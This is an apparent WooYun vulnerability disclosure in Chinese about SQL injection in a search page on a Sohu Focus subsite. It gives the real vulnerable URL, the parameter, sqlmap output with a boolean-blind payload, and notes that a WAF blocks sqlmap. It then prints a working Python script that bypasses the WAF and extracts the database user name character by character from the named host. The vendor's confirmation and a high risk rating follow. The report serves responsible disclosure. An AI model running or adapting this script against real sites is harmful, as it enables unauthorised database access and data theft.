wybug_title: 搜狐焦点某分站的SQL注入
wybug_detail:
漏洞详情 披露状态：   									2016-03-14：	细节已通知厂商并且等待厂商处理中									2016-03-14：	厂商已经确认，细节仅向厂商公开									2016-03-24：	细节向核心白帽子及相关领域专家公开									2016-04-03：	细节向普通白帽子公开									2016-04-13：	细节向实习白帽子公开									2016-04-28：	细节向公众公开  简要描述： 搜狐焦点某分站存在SQL注入。sqlmap依然没法跑出数据，附测试脚本 详细说明：  存在注入的链接：http://office.focus.cn/group/photo_search.php?group_id=80000&page=1&search_area=thesite&search_str=&search_type=picname&submit=%cb%d1%cb%f7%cd%bc%c6%ac
sqlmap resumed the following injection point(s) from stored session:---Parameter: search_str (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: group_id=80000&page=1&search_area=thesite&search_str=%' AND 9250=9250 AND '%'='&search_type=picname&submit=%cb%d1%cb%f7%cd%bc%c6%ac---[11:35:40] [INFO] testing MySQL[11:35:40] [INFO] confirming MySQL[11:35:40] [INFO] the back-end DBMS is MySQLweb application technology: Apacheback-end DBMS: MySQL >= 5.0.2[11:35:40] [WARNING] information_schema not available, back-end DBMS is MySQL < 5. database names will be fetched from 'mysql' database[11:35:40] [INFO] fetching number of databases[11:35:40] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval[11:35:40] [INFO] retrieved: [11:35:40] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'[11:35:40] [ERROR] unable to retrieve the number of databases[11:35:40] [INFO] falling back to current database[11:35:40] [INFO] fetching current database[11:35:40] [INFO] retrieved: [11:35:40] [CRITICAL] unable to retrieve the database names[11:35:40] [WARNING] HTTP error codes detected during run:403 (Forbidden) - 11 times
有WAF SQLmap获取数据或返回403   漏洞证明：  
import os,sys,re,stringimport requests as requestspayloads = list(string.ascii_lowercase)payloads += list(string.ascii_uppercase)for i in range(0,10):    payloads.append(str(i))payloads += ['@','_', '.']try:	for i in range(1,22,1):     	    for payload in payloads:		    res = requests.get('http://office.focus.cn/group/photo_search.php?group_id=80000&page=1&search_area=thesite&search_str=%%\'AND ascii(mid(user(),%s,1))=%s AND\'%%\'=\'&search_type=picname&submit=%%cb%%d1%%cb%%f7%%cd%%bc%%c6%%ac' % (i, ord(payload)),timeout=3)		    if len(res.text) > 60000:		    	print payload,except Exception, e:	print e
当前的数据库信息

   修复方案：  修复   版权声明：转载请注明来源 李长歌@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2016-03-14 12:24 厂商回复： 感谢支持。 最新状态： 暂无
